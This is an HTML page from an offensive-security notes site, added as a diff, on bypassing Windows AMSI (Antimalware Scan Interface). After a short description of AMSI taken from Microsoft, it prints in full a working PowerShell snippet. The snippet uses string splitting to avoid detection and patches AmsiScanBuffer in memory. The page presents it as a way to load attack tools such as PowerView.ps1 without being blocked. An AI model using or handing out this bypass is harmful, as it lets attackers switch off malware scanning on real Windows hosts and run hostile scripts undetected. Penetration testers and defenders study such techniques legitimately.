@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>AMSI Bypass - Notes</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Antimalware Scan Interface (AMSI)", url: "#_top", children: [
+              {title: "Description AMSI", url: "#description-amsi" },
+          ]},
+          {title: "Example", url: "#example", children: [
+          ]},
+          {title: "AMSI Bypass (rasta-mouse)", url: "#amsi-bypass-rasta-mouse", children: [
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_windows_domain_local_privilege_escalation/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_windows_domain_local_privilege_escalation/" class="btn btn-xs btn-link">
+        Local Privilige Escalation
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../running_program_as_user_without_guiinteraction/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../running_program_as_user_without_guiinteraction/" class="btn btn-xs btn-link">
+        Running Program as User Without GUI Interaction
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="antimalware-scan-interface-amsi">Antimalware Scan Interface (AMSI)<a class="headerlink" href="#antimalware-scan-interface-amsi" title="Permanent link">#</a></h1>
+<p>Source: <a href="https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-portal">Antimalware Scan Interface (AMSI)</a></p>
+<p>When trying to invoke expression and load, for example, <code>PowerView.ps1</code> directly from the internet in order to not leave stuff on the disk you'll most properly run in to being blocked due to AMSI. This can be bypassed by utilizing rasta-mouses amsi-bypass which patches the memory to allow execution of suspicious commands.</p>
+<h2 id="description-amsi">Description AMSI<a class="headerlink" href="#description-amsi" title="Permanent link">#</a></h2>
+<pre><code class="text">The Windows Antimalware Scan Interface (AMSI) is a versatile interface standard
+that allows your applications and services to integrate with any antimalware
+product that's present on a machine. AMSI provides enhanced malware protection
+for your end-users and their data, applications, and workloads.
+
+AMSI is agnostic of antimalware vendor; it's designed to allow for the most
+common malware scanning and protection techniques provided by today's
+antimalware products that can be integrated into applications. It supports a
+calling structure allowing for file and memory or stream scanning, content
+source URL/IP reputation checks, and other techniques.
+
+AMSI also supports the notion of a session so that antimalware vendors can
+correlate different scan requests. For instance, the different fragments of a
+malicious payload can be associated to reach a more informed decision, which
+would be much harder to reach just by looking at those fragments in isolation
+</code></pre>
+
+<h1 id="example">Example<a class="headerlink" href="#example" title="Permanent link">#</a></h1>
+<p><img alt="AMSI bypass - Rasta-mouse" src="../amsi_bypass.png" title="AMSI bypass - Rasta-mouse" /></p>
+<h1 id="amsi-bypass-rasta-mouse">AMSI Bypass (rasta-mouse)<a class="headerlink" href="#amsi-bypass-rasta-mouse" title="Permanent link">#</a></h1>
+<p>Source: <a href="https://github.com/rasta-mouse/AmsiScanBufferBypass">AmsiScanBufferBypass</a></p>
+<pre><code class="powershell">$Win32 = @&quot;
+using System;
+using System.Runtime.InteropServices;
+public class Win32 {
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern IntPtr LoadLibrary(string name);
+    [DllImport(&quot;kernel32&quot;)]
+    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+}
+&quot;@
+
+Add-Type $Win32
+
+$LoadLibrary = [Win32]::LoadLibrary(&quot;am&quot; + &quot;si.dll&quot;)
+$Address = [Win32]::GetProcAddress($LoadLibrary, &quot;Amsi&quot; + &quot;Scan&quot; + &quot;Buffer&quot;)
+$p = 0
+[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
+$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../../attacking_windows_domain_local_privilege_escalation/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../../attacking_windows_domain_local_privilege_escalation/" class="btn btn-xs btn-link">
+        Local Privilige Escalation
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../running_program_as_user_without_guiinteraction/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../running_program_as_user_without_guiinteraction/" class="btn btn-xs btn-link">
+        Running Program as User Without GUI Interaction
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/attacking_active_directory_domain/powershell/amsi_bypass.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
